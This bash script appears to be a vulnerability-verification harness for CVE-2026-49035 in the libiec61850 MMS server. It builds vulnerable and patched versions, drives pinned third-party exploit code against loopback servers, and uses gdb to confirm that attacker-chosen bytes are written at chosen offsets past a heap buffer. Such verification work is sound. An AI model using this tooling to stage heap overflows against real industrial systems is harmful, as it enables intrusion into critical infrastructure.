#!/usr/bin/env bash
# rung-4 probe for CVE-2026-49035. Loopback only; all third-party code is
# extracted verbatim from the pinned tarballs checked by run.sh.
#   bash r4_probe.sh <absolute-outdir>
# Prints PASS/FAIL checks for: (1) remotely staged bytes via the pinned
# ObtainFile client, (2) chosen bytes at chosen offsets past the live
# sendBuffer in an unsanitized server under gdb, (3) a conforming client that
# stops on AARE failure, making the released v1.6.2 build a clean control.
set -uo pipefail
HERE=$(cd "$(dirname "$0")" && pwd)
OUT=${1:-"$HERE/r4-out"}
mkdir -p "$OUT"
cd "$HERE" || exit 2
OUT=$(cd "$OUT" && pwd)
cd "$HERE/src" || exit 2
sha256sum -c SHA256SUMS > "$OUT/pins.log" 2>&1 || exit 2
cd "$HERE" || exit 2

B="$OUT/build"
rm -rf "$B"
mkdir -p "$B" || exit 2
tar -xzf "$HERE/src/libiec61850-a1396111.tar.gz" -C "$B" || exit 2
tar -xzf "$HERE/src/libiec61850-v1.6.2.tar.gz" -C "$B" || exit 2
tar -xzf "$HERE/src/libiec-security-poc-main.tar.gz" -C "$B" || exit 2
V=$(find "$B" -maxdepth 1 -type d -name 'libiec61850-a1396111*' | head -1)
F=$(find "$B" -maxdepth 1 -type d -name 'libiec61850-1.6.2' | head -1)
P="$B/libiec-security-poc-main/CVE-2026-49035-mms-fileread-heap-rce"
[ -n "$V" ] && [ -n "$F" ] && [ -f "$P/rce/exploit.py" ] || exit 2
CLIENT="$P/poc/exploit_client.c"

build() { # <source> <builddir> <flags>
  cmake -S "$1" -B "$2" -DCMAKE_BUILD_TYPE=Debug \
    -DCMAKE_C_FLAGS="$3" ${4:+-DCMAKE_EXE_LINKER_FLAGS="$4"} \
    > "$2.cmake.log" 2>&1 || return 2
  cmake --build "$2" --target server_example_files -- -j4 \
    >> "$2.cmake.log" 2>&1 || return 2
}
PLAIN='-g -O0 -fno-omit-frame-pointer'
SAN='-fsanitize=address -g -O0 -fno-omit-frame-pointer'
build "$V" "$B/plain" "$PLAIN" || exit 2
build "$V" "$B/asan-vuln" "$SAN" -fsanitize=address || exit 2
build "$F" "$B/asan-fixed" "$SAN" -fsanitize=address || exit 2
SDIR="$B/plain/examples/server_example_files"
ADIR="$B/asan-vuln/examples/server_example_files"
FDIR="$B/asan-fixed/examples/server_example_files"

pass=0; fail=0
check() { if [ "$2" = 1 ]; then echo "PASS $1"; pass=$((pass+1));
          else echo "FAIL $1"; fail=$((fail+1)); fi; }
server() { # <dir> <port> <logtag> <asan|plain>
  local d=$1 p=$2 tag=$3 mode=$4
  if [ "$mode" = asan ]; then
    ( cd "$d" && exec env ASAN_OPTIONS=detect_leaks=0:abort_on_error=0 \
        timeout 45 ./server_example_files "$p" ) > "$OUT/$tag.server.log" 2>&1 &
  else
    ( cd "$d" && exec timeout 45 ./server_example_files "$p" ) \
      > "$OUT/$tag.server.log" 2>&1 &
  fi
  echo $!
}
stop() { kill "$1" 2>/dev/null; wait "$1" 2>/dev/null; }
expect_staged() { # <expected sha> <path>
  [ -f "$2" ] && [ "$(sha256sum "$2" | cut -d' ' -f1)" = "$1" ] && echo 1 || echo 0
}

# 1. Remote byte choice: the pinned RCE harness's ObtainFile staging function
# is called with a benign ramp payload only; no exploit trigger, no exec.
cat > "$OUT/stage.py" <<'PY'
import hashlib, importlib.util, sys
spec = importlib.util.spec_from_file_location("pinned", sys.argv[1])
m = importlib.util.module_from_spec(spec); spec.loader.exec_module(m)
data = bytes(i % 256 for i in range(120000))
print("payload_sha256=" + hashlib.sha256(data).hexdigest())
ok = m.stage_file("127.0.0.1", int(sys.argv[2]), data, "REMOTE.BIN")
print("stage_return=" + str(ok))
PY
mkdir -p "$SDIR/vmd-filestore"
SP=$(server "$SDIR" 10140 stage plain); sleep 3
python3 "$OUT/stage.py" "$P/rce/exploit.py" 10140 > "$OUT/stage.client.log" 2>&1
HASH=$(grep -o 'payload_sha256=[0-9a-f]*' "$OUT/stage.client.log" | cut -d= -f2)
check "ObtainFile staged 120000 remotely chosen bytes (sha256 match)" \
  "$(expect_staged "$HASH" "$SDIR/vmd-filestore/REMOTE.BIN")"
grep -q 'ObtainFile complete' "$OUT/stage.client.log"
check "client observed ObtainFile completion" "$([ $? -eq 0 ] && echo 1 || echo 0)"
stop "$SP"

# 2. Chosen bytes at chosen offsets in the live heap. gdb stops right after
# fread and verifies the ramp at base+65080..+65159 against the caller's
# bufPos; base+65100 is 20 bytes past the 65100-byte sendBuffer.
cat > "$OUT/chosen.gdb" <<'GDB'
set pagination off
set confirm off
set logging file OUTLOG
set logging overwrite on
set logging enabled on
set breakpoint pending on
break mms_file_service.c:873
commands
 silent
 printf "\n=== after fread: buffer=%p fileChunkSize=%lu bufPos=%d ===\n", buffer, fileChunkSize, bufPos
 set $b = (unsigned char*)buffer
 printf "malloc header base-16/base-8:\n"
 x/2gx $b-16
 printf "bytes base+65080..+65159 (end is base+65100):\n"
 x/80bx $b+65080
 set $ok = 1
 set $i = 0
 while $i < 80
   if $b[65080+$i] != (unsigned char)((65080 - bufPos + $i) % 256)
     set $ok = 0
   end
   set $i = $i + 1
 end
 printf "CHOSEN_BYTES_AT_CHOSEN_OFFSETS=%d\n", $ok
 continue
end
run 10141
GDB
sed "s#OUTLOG#$OUT/chosen.gdb.log#" "$OUT/chosen.gdb" > "$OUT/chosen-run.gdb"
( cd "$SDIR" && timeout 45 gdb -q -batch -x "$OUT/chosen-run.gdb" \
    --args ./server_example_files 10141 > "$OUT/chosen.gdb.stdout" 2>&1 ) &
GP=$!
sleep 6
python3 "$P/poc/raw/exploit_raw.py" 127.0.0.1 10141 REMOTE.BIN 1 \
  > "$OUT/chosen.client.log" 2>&1
sleep 2
stop "$GP"
grep -q 'CHOSEN_BYTES_AT_CHOSEN_OFFSETS=1' "$OUT/chosen.gdb.log" 2>/dev/null
check "remote-chosen bytes found past sendBuffer in live server heap" \
  "$([ $? -eq 0 ] && echo 1 || echo 0)"

# 3. A conforming client stops on AARE failure: vulnerable triggers ASan,
# fixed does not. The client source is the pinned third-party exploit_client.c.
INC="-I$F/src/mms/inc -I$F/hal/inc -I$F/src/common/inc -I$F/src/iso_common/inc -I$F/hal/linux -I$F/config"
gcc -g -O0 -fsanitize=address $INC "$CLIENT" \
  "$B/asan-fixed/src/libiec61850.a" "$B/asan-fixed/hal/libhal.a" \
  -lpthread -lm -o "$OUT/conforming_client" > "$OUT/client.compile.log" 2>&1 || exit 2
for T in vuln fixed; do
  D=$( [ "$T" = vuln ] && echo "$ADIR" || echo "$FDIR" )
  mkdir -p "$D/vmd-filestore"
  python3 -c "open('$D/vmd-filestore/TESTFILE.BIN','wb').write(bytes(i%256 for i in range(200000)))"
done
VP=$(server "$ADIR" 10142 conf-vuln asan); sleep 3
timeout 15 "$OUT/conforming_client" 127.0.0.1 10142 > "$OUT/conf-vuln.client.log" 2>&1
sleep 2; stop "$VP"
grep -q 'WRITE of size 178157' "$OUT/conf-vuln.server.log"
check "conforming client triggers ASan WRITE in vulnerable build" \
  "$([ $? -eq 0 ] && echo 1 || echo 0)"
FP=$(server "$FDIR" 10143 conf-fixed asan); sleep 3
timeout 15 "$OUT/conforming_client" 127.0.0.1 10143 > "$OUT/conf-fixed.client.log" 2>&1
C=$?
sleep 2; stop "$FP"
grep -q 'MmsConnection_connect() failed' "$OUT/conf-fixed.client.log"
check "conforming client stops on fixed-build AARE failure rc=$C" \
  "$([ $? -eq 0 ] && echo 1 || echo 0)"
! grep -q 'AddressSanitizer' "$OUT/conf-fixed.server.log"
check "fixed build ASan-clean with conforming client" \
  "$([ $? -eq 0 ] && echo 1 || echo 0)"

echo "TOTAL PASS=$pass FAIL=$fail"
[ "$fail" -eq 0 ] && { echo "ALL CHECKS PASS rc 0"; exit 0; }
echo "SOME CHECKS FAILED rc 1"; exit 1
